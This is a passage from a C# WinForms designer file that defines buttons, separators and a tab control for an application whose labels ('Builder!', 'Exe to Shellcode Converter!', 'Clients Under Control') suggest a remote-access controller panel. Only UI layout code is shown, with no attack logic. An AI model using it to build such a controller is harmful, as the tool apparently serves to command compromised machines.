            this.guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GradientButton5.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton5.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton5.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton5.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton5.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton5.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton5.Image")));
            this.guna2GradientButton5.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2GradientButton5.Location = new System.Drawing.Point(6, 484);
            this.guna2GradientButton5.Name = "guna2GradientButton5";
            this.guna2GradientButton5.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton5.Size = new System.Drawing.Size(38, 42);
            this.guna2GradientButton5.TabIndex = 151;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2GradientButton5, "Videos/Tutorials!");
            this.guna2GradientButton5.Click += new System.EventHandler(this.guna2Shapes4_Click);
            // 
            // guna2GradientButton4
            // 
            this.guna2GradientButton4.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.guna2GradientButton4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.guna2GradientButton4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton4.BorderRadius = 12;
            this.guna2GradientButton4.BorderThickness = 1;
            this.guna2GradientButton4.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton4.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton4.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton4.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.guna2GradientButton4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2GradientButton4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2GradientButton4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2GradientButton4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GradientButton4.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton4.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton4.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton4.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton4.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton4.Image")));
            this.guna2GradientButton4.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2GradientButton4.Location = new System.Drawing.Point(6, 436);
            this.guna2GradientButton4.Name = "guna2GradientButton4";
            this.guna2GradientButton4.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton4.Size = new System.Drawing.Size(38, 42);
            this.guna2GradientButton4.TabIndex = 150;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2GradientButton4, "Usefull Links!");
            this.guna2GradientButton4.Click += new System.EventHandler(this.guna2Shapes2_Click);
            // 
            // guna2GradientButton3
            // 
            this.guna2GradientButton3.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.guna2GradientButton3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.guna2GradientButton3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton3.BorderRadius = 12;
            this.guna2GradientButton3.BorderThickness = 1;
            this.guna2GradientButton3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton3.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton3.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton3.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.guna2GradientButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2GradientButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2GradientButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2GradientButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GradientButton3.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton3.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton3.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton3.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton3.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton3.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton3.Image")));
            this.guna2GradientButton3.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2GradientButton3.Location = new System.Drawing.Point(6, 388);
            this.guna2GradientButton3.Name = "guna2GradientButton3";
            this.guna2GradientButton3.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton3.Size = new System.Drawing.Size(38, 42);
            this.guna2GradientButton3.TabIndex = 149;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2GradientButton3, "About us!");
            this.guna2GradientButton3.Click += new System.EventHandler(this.aboutToolStripMenuItem1_Click);
            // 
            // guna2GradientButton2
            // 
            this.guna2GradientButton2.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.guna2GradientButton2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.guna2GradientButton2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton2.BorderRadius = 12;
            this.guna2GradientButton2.BorderThickness = 1;
            this.guna2GradientButton2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton2.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton2.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton2.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GradientButton2.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton2.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton2.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton2.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton2.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton2.Image")));
            this.guna2GradientButton2.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2GradientButton2.Location = new System.Drawing.Point(6, 340);
            this.guna2GradientButton2.Name = "guna2GradientButton2";
            this.guna2GradientButton2.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton2.Size = new System.Drawing.Size(38, 42);
            this.guna2GradientButton2.TabIndex = 148;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2GradientButton2, "Builder!");
            this.guna2GradientButton2.Click += new System.EventHandler(this.builderToolStripMenuItem1_Click_1);
            // 
            // guna2GradientButton1
            // 
            this.guna2GradientButton1.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.guna2GradientButton1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.guna2GradientButton1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton1.BorderRadius = 12;
            this.guna2GradientButton1.BorderThickness = 1;
            this.guna2GradientButton1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton1.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton1.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton1.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GradientButton1.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton1.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton1.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton1.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton1.Image = ((System.Drawing.Image)(resources.GetObject("guna2GradientButton1.Image")));
            this.guna2GradientButton1.ImageSize = new System.Drawing.Size(30, 30);
            this.guna2GradientButton1.Location = new System.Drawing.Point(6, 292);
            this.guna2GradientButton1.Name = "guna2GradientButton1";
            this.guna2GradientButton1.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton1.Size = new System.Drawing.Size(38, 42);
            this.guna2GradientButton1.TabIndex = 147;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2GradientButton1, "Exe to Shellcode Converter!");
            this.guna2GradientButton1.Click += new System.EventHandler(this.btnTASKSLISTVIEW_Click);
            // 
            // guna2Separator6
            // 
            this.guna2Separator6.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator6.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2Separator6.Location = new System.Drawing.Point(-9, 842);
            this.guna2Separator6.Name = "guna2Separator6";
            this.guna2Separator6.Size = new System.Drawing.Size(71, 10);
            this.guna2Separator6.TabIndex = 146;
            this.guna2Separator6.UseTransparentBackground = true;
            // 
            // guna2ControlBox1
            // 
            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2ControlBox1.BorderThickness = 1;
            this.loadForm.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2ControlBox1.HoverState.BorderColor = System.Drawing.Color.DimGray;
            this.guna2ControlBox1.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2ControlBox1.HoverState.IconColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ControlBox1.IconColor = System.Drawing.Color.DarkGray;
            this.guna2ControlBox1.Location = new System.Drawing.Point(0, 13);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.Size = new System.Drawing.Size(40, 29);
            this.guna2ControlBox1.TabIndex = 145;
            // 
            // guna2Separator5
            // 
            this.guna2Separator5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator5.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2Separator5.Location = new System.Drawing.Point(-12, -5);
            this.guna2Separator5.Name = "guna2Separator5";
            this.guna2Separator5.Size = new System.Drawing.Size(71, 10);
            this.guna2Separator5.TabIndex = 144;
            this.guna2Separator5.UseTransparentBackground = true;
            // 
            // guna2VSeparator2
            // 
            this.guna2VSeparator2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2VSeparator2.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VSeparator2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VSeparator2.Location = new System.Drawing.Point(46, 0);
            this.guna2VSeparator2.Name = "guna2VSeparator2";
            this.guna2VSeparator2.Size = new System.Drawing.Size(10, 981);
            this.guna2VSeparator2.TabIndex = 18;
            // 
            // guna2VSeparator1
            // 
            this.guna2VSeparator1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2VSeparator1.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VSeparator1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VSeparator1.Location = new System.Drawing.Point(-5, 52);
            this.guna2VSeparator1.Name = "guna2VSeparator1";
            this.guna2VSeparator1.Size = new System.Drawing.Size(10, 930);
            this.guna2VSeparator1.TabIndex = 17;
            // 
            // LISTVIEWSPANEL1
            // 
            this.LISTVIEWSPANEL1.Controls.Add(this.guna2TabControl1);
            this.LISTVIEWSPANEL1.Controls.Add(this.LISTVIEWSPANELSMALL2);
            this.loadForm.SetDecoration(this.LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.LISTVIEWSPANEL1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.LISTVIEWSPANEL1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.LISTVIEWSPANEL1.Location = new System.Drawing.Point(0, 0);
            this.LISTVIEWSPANEL1.Name = "LISTVIEWSPANEL1";
            this.LISTVIEWSPANEL1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.LISTVIEWSPANEL1.Size = new System.Drawing.Size(1559, 848);
            this.LISTVIEWSPANEL1.TabIndex = 6;
            // 
            // guna2TabControl1
            // 
            this.guna2TabControl1.Alignment = System.Windows.Forms.TabAlignment.Bottom;
            this.guna2TabControl1.Controls.Add(this.tabPage1);
            this.guna2TabControl1.Controls.Add(this.tabPage2);
            this.guna2TabControl1.Controls.Add(this.tabPage3);
            this.guna2TabControl1.Controls.Add(this.tabPage4);
            this.guna2Transition2.SetDecoration(this.guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2TabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2TabControl1.ItemSize = new System.Drawing.Size(180, 35);
            this.guna2TabControl1.Location = new System.Drawing.Point(0, 52);
            this.guna2TabControl1.Name = "guna2TabControl1";
            this.guna2TabControl1.SelectedIndex = 0;
            this.guna2TabControl1.Size = new System.Drawing.Size(1559, 796);
            this.guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(156)))), ((int)(((byte)(160)))), ((int)(((byte)(167)))));
            this.guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2TabControl1.TabButtonSize = new System.Drawing.Size(180, 35);
            this.guna2TabControl1.TabIndex = 21;
            this.guna2TabControl1.TabMenuBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalBottom;
            // 
            // tabPage1
            // 
            this.tabPage1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.tabPage1.Controls.Add(this.guna2VScrollBar4);
            this.tabPage1.Controls.Add(this.listView1);
            this.tabPage1.Controls.Add(this.guna2Panel2);
            this.guna2Transition1.SetDecoration(this.tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.tabPage1.Font = new System.Drawing.Font("Electrolize", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.tabPage1.Location = new System.Drawing.Point(4, 4);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(1551, 753);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Clients Under Control";
            // 
            // guna2VScrollBar4
            // 
